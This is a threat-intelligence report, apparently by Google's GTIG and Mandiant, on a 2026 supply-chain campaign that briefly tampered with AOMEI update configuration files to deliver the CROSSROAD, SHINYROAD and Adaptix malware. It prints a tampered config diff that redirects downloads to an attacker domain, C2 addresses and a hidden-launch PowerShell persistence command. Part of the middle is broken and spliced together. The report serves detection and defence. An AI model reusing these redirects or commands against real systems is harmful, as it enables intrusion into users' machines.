Intelligence\"],\"timeRequired\":\"PT41M\"}\u003c/script\u003e"],["Investigating Ephemeral Supply Chain Tampering"],null,null,[[null,null,[null,[null,"\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eWritten by: \u003cspan style\u003d\"vertical-align:baseline\"\u003eTyler McLellan\u003cbr\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIntroduction\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGoogle Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. This is the first time that we have encountered a software supply chain compromise that was implemented with these very short windows, effectively evading traditional point-in-time triage and automated file scanning.  \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe campaign delivered a multi-stage payload chain involving the newly tracked CROSSROAD downloader and SHINYROAD backdoor. The threat actor iteratively modified its tradecraft, pivoting its staging infrastructure from cloud providers to dedicated domains and legitimate cloud storage. This evolving staging setup makes it particularly challenging for defenders to establish effective infrastructure-based blocking or network controls. We attribute this activity to a threat cluster we are tracking as UNC7017. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eBased on available telemetry, impacted organizations spanned diverse sectors, including IT services, telecommunications, higher education and related entities in Australia, Brazil, India, Pakistan, Portugal, Singapore, South Africa, Spain, Switzerland, Türkiye, and the United States. That said, because the campaign attempted to deliver malware to any system polling the update distribution servers during the threat actor’s tampering windows, victimology was opportunistic and likely extends more broadly than the organizations we directly identified. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThis campaign was initially identified through collaborative research with the ManageEngine Threat Analysis Lab (METAL), part of Zoho Corporation, whose endpoint detection and response (EDR) telemetry first detected the activity in late May across multiple customer environments. We thank the METAL team for their proactive telemetry sharing and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem. Following this joint effort, GTIG notified potentially affected organizations and shared technical findings with AOMEI Technology. AOMEI reported that they took corrective action to secure their distribution servers. \u003cspan style\u003d\"vertical-align:baseline\"\u003eMETAL’s analysis of this campaign is \u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eavailable\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e in their \u003c/span\u003e\u003ca href\u003d\"https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eblog\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eHow AOMEI Update and Notification Systems Work\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAOMEI Backupper provides data backup, disk cloning, and disaster recovery, while AnyViewer facilitates remote desktop access and support. Users of these products rely on the ABMarket update flow and its associated background services (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eBackupper.exe\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e and \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eABNotify.exe\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e) that periodically poll remote endpoints over HTTPS for update notifications and promotional pop ups:\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: AOMEI Update Mechanism\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-2000x2000.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-2000x2000.png 1926w"," 1060px,  1926px","https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-2000x2000.png"],null,3]]],[null,null,[null,[null,"\u003col\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eUpdate Configuration\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003edown_html.ini\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e): The software periodically sends an HTTPS request to \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003ehttps://www2.aomeisoftware.com/download/abpopup/down_html.ini\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e. This file contains the version number, the MD5 hash of the expected update package, and the URL where the client should download \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eupgrade-now.zip\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eNotification Configuration (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eNotifycfg.ini\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e): The software contacts \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003ehttps://account.aomeitech.com/Notifycfg.ini\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e. This file instructs the local notification process (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eABNotify.exe\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e) what messages to display and specifies commands or programs located in the software’s local directory to execute.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUnder normal conditions, these files direct the client to download official files hosted on AOMEI’s own domain (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003ewww2.aomeisoftware.com\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e).\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCampaign Overview\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRather than maintaining a persistent, static modification on the vendor’s distribution servers, GTIG and METAL’s telemetry indicates UNC7017 conducted repeated, short-burst configuration tampering. We confirmed several tampering windows in 2026, alongside related malware samples observed in the wild starting in late April. However, given the short duration of these windows, it is probable that additional tampering occurred throughout the campaign that remained outside our visibility. Systems checking for updates during an active window received malicious instructions, while systems checking before or after received clean, authentic files. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eDuring the brief tampering windows, the threat actor modified the update settings file on the update server to redirect the software to download a malicious ZIP package from attacker-controlled servers instead of legitimate updates. The threat actor also altered the notification settings file on the update server to abuse the software’s automatic notification service, forcing the system to immediately execute the downloaded malware locally. If a user’s application checked for updates while the threat actor’s modifications were active, then the application would download the trojanized update and execute malware. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIn cases where altered configuration files were active, the threat actor directed clients to download a weaponized ZIP archive containing CROSSROAD, an initial downloader responsible for environment validation and staging secondary components. CROSSROAD subsequently established scheduled task persistence to deploy SHINYROAD, a modular backdoor framework delivered via trojanized administration utilities to facilitate covert command and control.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eShort Burst Supply Chain Tampering\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eA defining characteristic of UNC7017's operational security is its reliance on ephemeral, time-compressed server modifications. Across all directly observed waves, the adversary avoided leaving malicious configurations resident on AOMEI's update servers:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMay 28: 10-minute exposure window (05:40 – 05:50 UTC)\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eJuly 16: 6-minute exposure window (08:33 – 08:39 UTC)\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eJuly 20: 5-minute exposure window (10:35 – 10:40 UTC)\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAt the conclusion of each window, UNC7017 reverted both down_html.ini and Notifycfg.ini to their legitimate contents. This hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eWeaponizing Native Update Logic: down_html.ini and Configuration Bloat\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eTo compromise endpoints without relying on software vulnerabilities, UNC7017 abused the AOMEI client's legitimate update and popup rendering workflow. By default, the client downloads update archives into its Tmphtml directory, unpacks them to the local html/ directory, and processes instructions from two remote configuration files: down_html.ini and Notifycfg.ini.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eTo ensure the AOMEI client accepted and extracted the weaponized upgrade-now.zip archive, UNC7017 systematically incremented the minor build version (“thrid”) and updated the expected MD5 checksum in down_html.ini during each tampering window:\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003e[Date]\r\n-Url\u003dhttps://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip\r\n+Url\u003dhttps://promotion.storage-data.com/download/abpopup/upgrade-now.zip\r\nName\u003dupgrade-now\r\n[Version]\r\nmaj\u003d8\r\nmin\u003d2\r\n-thrid\u003d5\r\n+thrid\u003d6\r\n[MD5]\r\n-Val\u003dEE89C99F3753231771170F5D9CBBAE1E\r\n+Val\u003d31323E7E738230FA6A8DEEF2B7894666\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eFigure 2: July 16 tampering of down_html.ini redirecting downloads to promotion.storage-data.com with incremented version (thrid\u003d6) and synchronized MD5 hash.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eDuring the 6-minute window on July 16, UNC7017 simultaneously modified Notifycfg.ini (SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), injecting over 35,000 lines of repetitive configuration sections named [dummy_XXXXXX]. This extreme configuration bloat was structured to override standard client version checks forcing the client to trigger an update regardless of its installed version and immediately execute the unpacked CROSSROAD dropper (upgrade-now.exe) from the local html/ directory.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eInfrastructure public cloud buckets and actor controlled lookalike domains, likely to test payload delivery and masquerade as legitimate vendor traffic. \u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan The DLL reads \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003econfig.zip\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e directly from shared memory, extracts the encrypted payload \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003emetadata.dat\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e, and decrypts it using ChaCha20 with an HMAC-SHA256 derived key and IV. The decrypted payload consists of compiled Python bytecode, which \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eRuntimeComponent.dll\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e executes within an embedded PocketPy interpreter, establishing initial C2 connectivity to \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003e8.218.65.184:443\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEvolution of the SHINYROAD Architecture\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAnalysis of earlier campaign variants revealed that SHINYROAD relies on custom C-level extensions (_pyio_compat, _pyio_struct, and pkpy) to avoid loading standard Python libraries on disk:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eCustom Binary C2 Protocol\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Earlier variants communicated over raw TCP (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003e8.218.65.184:41397\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e). The agent generates a unique ID by fingerprinting the hostname and username, authenticates via a hard-coded handshake key, and dynamically transitions all subsequent communication to use symmetric encryption derived from this unique ID.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eIn-Memory Capabilities\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: The engine supports interactive remote shell access (os.system), traffic chaffing (generating randomized junk packets to disrupt network signatures), and dynamic in-memory extension via the \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003epkpy\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e WorkPool thread manager without writing script modules to disk.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003cspan style\u003d\"font-style:italic;vertical-align:baseline\"\u003ePost-Exploitation: Nitro PDF Theme \u0026amp; Adaptix C2\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIn mid-July 2026, following the successful deployment of SHINYROAD, telemetry identified later-stage activity where UNC7017 pushed down ADAPTAGENT, the client portion of the Adaptix C2 post-exploitation framework. To blend in or appear as user-downloaded activity, these payloads masqueraded as Nitro PDF promotional and scanning tools (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eNitroPromotion.exe\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e):\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003ePersistence:\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e The malware installed a scheduled task named \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003e\\NitroRuntime\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e that executed:\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003epowershell -Command \u0026quot;Start-Process \u0026#39;C:\\Users\\\u0026lt;USER\u0026gt;\\AppData\\Local\\Temp\\NitroPromotion.exe\u0026#39; -WindowStyle Hidden\u0026quot;\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eFigure 6: NitroRuntime scheduled task persistence\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eAdaptix C2 Beaconing\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: The executable sideloaded \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eEztwain4.dll\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (ADAPTAGENT) from \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003e%LOCALAPPDATA%\\Nitro Pro\\\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e, which established periodic 2-minute beacons to \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003e8.210.84.56:6800\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOutlook and Implications\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThis campaign highlights a broader evolution in software supply chain attack methodologies. Supply chain intrusions have historically focused on inserting backdoors into software source code or tampering with developer build pipelines (e.g., \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eSolarWinds\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e, \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003e3CX\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e). While highly impactful, compromised source trees leave persistent binary signatures in official release files that can be discovered during post-release binary analysis.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC7017's use of ephemeral configuration tampering represents a lower-overhead, higher-stealth alternative:\u003c/span\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eAnti-Analysis by Design:\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e By restricting configuration changes to five to ten minute windows, the vast majority of legitimate users and automated repository crawlers only encounter authentic, vendor-signed files.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eSelective Exploitation\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Threat actors can selectively compromise target organizations that maintain frequent polling intervals while minimizing their exposure window on vendor infrastructure.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eDual-Pronged Approach\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Combining software update redirection with invisible WebDAV NTLM coercion could allow adversaries to harvest credentials from passive users even if binary payload execution is blocked.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eCo-opting Commercial Software\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Deploying unmodified versions of legitimate administration tools (such as Radmin 3.x) to masquerade sideloaded covert channels illustrates how adversaries blend commercial remote management capabilities with hidden backdoor modules.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRemediation and Hardening\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eDefenders should focus on behavioral profiling of updater processes, specifically monitoring for unsigned child processes spawned by background update runners and unauthorized network redirection originating from trusted desktop software. For broader recommendations on securing software delivery pipelines, please refer to our previously published \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eMitigation Guidance for Supply Chain Compromise\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eVendor Notification \u0026amp; Architecture Hardening\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOn July 17, 2026, Mandiant notified AOMEI Technology regarding the observed configuration tampering on their update infrastructure and provided relevant indicators. AOMEI subsequently responded on July 29, 2026, stating that corrective actions had been taken.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eWhy Server-Side Remediation Does Not Disinfect Endpoints\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCrucially, server-side remediation does not clean endpoints that downloaded malicious updates during earlier tampering windows. Because the tampering occurred in brief, short bursts, systems that received these files may remain compromised without the organization's knowledge unless proactive endpoint hunting and remediation are performed.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003ePersistent Resident Payloads\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Endpoints that polled for updates during an active tampering window downloaded and staged persistent payloads (via scheduled tasks) that remain fully operational even after the vendor restores authentic .ini files on the origin servers.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eObscured Root Cause\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: While the subsequent backdoor activity and scheduled tasks generate detectable endpoint telemetry, the ephemeral delivery vector obscures the initial intrusion mechanism. Because server tampering lasted approximately 5 minutes—and the loader actively reverted local configuration files—investigators reviewing vendor update URLs hours later will observe only benign, authentic infrastructure, complicating root cause analysis and patient-zero identification.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eHunting Imperative\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Organizations running AOMEI software cannot assume they are protected solely because the vendor took corrective server-side action. Enterprise security teams must perform retrospective endpoint and network hunts across the entire April–July time frame using the indicators and YARA rules provided in this post.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGuidance for Software Vendors \u0026amp; Developers\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eSoftware supply chain security extends beyond developer workstations and build pipelines. When desktop software relies on remote configuration files to manage update and notification behaviors, adversaries can target the distribution layer rather than the source code. To defend against configuration tampering and distribution-channel hijacking, software vendors should implement the following security controls:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eEnd-to-End Cryptographic Signature Verification\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Client applications must cryptographically verify Authenticode digital signatures and validate vendor certificates on all downloaded executables and archives before extraction or execution. Update clients should never rely solely on transport-layer HTTPS or remote checksums (such as cleartext MD5 values in an unauthenticated configuration file).\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eCryptographically Signed Configuration Files\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Remote configuration files (.ini, .json, or .xml) should be digitally signed using asymmetric public key cryptography. If an origin server or content delivery network (CDN) is modified without authorization, client software will detect the invalid signature and reject the configuration.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eDomain Allowlisting and Destination Pinning\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Software update clients should enforce strict destination pinning, restricting update downloads exclusively to official, pre-approved vendor domains and CDNs. Update engines should reject redirection to arbitrary third-party domains or generic public cloud storage buckets.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eRestricting Uniform Resource Identifier (URI) Schemes in In-App Handlers\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Embedded web views, promotional popups, and notification handlers should strictly enforce secure web protocols (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003ehttps://\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e) and explicitly disallow local file (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003efile://\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e) and UNC WebDAV schemes to prevent external NTLM credential coercion.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eDecoupling Core Updates from Marketing Channels\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Separating essential software maintenance routines from dynamic promotional popups and notification banners reduces the attack surface and ensures that advertising channels cannot trigger local code execution.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eOrigin Integrity Monitoring and Access Controls\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: Origin web servers and object storage buckets hosting update metadata should enforce strict access controls, multi-factor authentication, and automated real-time file integrity monitoring (FIM) with immediate alerting on configuration changes.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e"]]],[null,null,[null,[null,"\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGuidance for Security Operations (SOC) \u0026amp; Incident Responders\u003c/span\u003e\u003c/h4\u003e\n\u003ch4\u003e\u003cspan style\u003d\"font-style:italic;vertical-align:baseline\"\u003eOvercoming the \"Point-in-Time\" Triage Pitfall\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe short-burst nature of this attack creates a unique challenge for incident response:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eThe Triage Trap\u003c/strong\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e: When an EDR alert fires for a suspicious process spawned by an updater, SOC analysts frequently attempt to validate the alert by navigating to the vendor's download URL or checking URL reputation. Because the threat actor reverted the remote configuration files within five to ten minutes, the vendor's server returns authentic, clean files most of the time, leading analysts to mistakenly dismiss the detection as a false positive.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003eActionable IR Protocol\u003c/strong\u003e\u003cspan 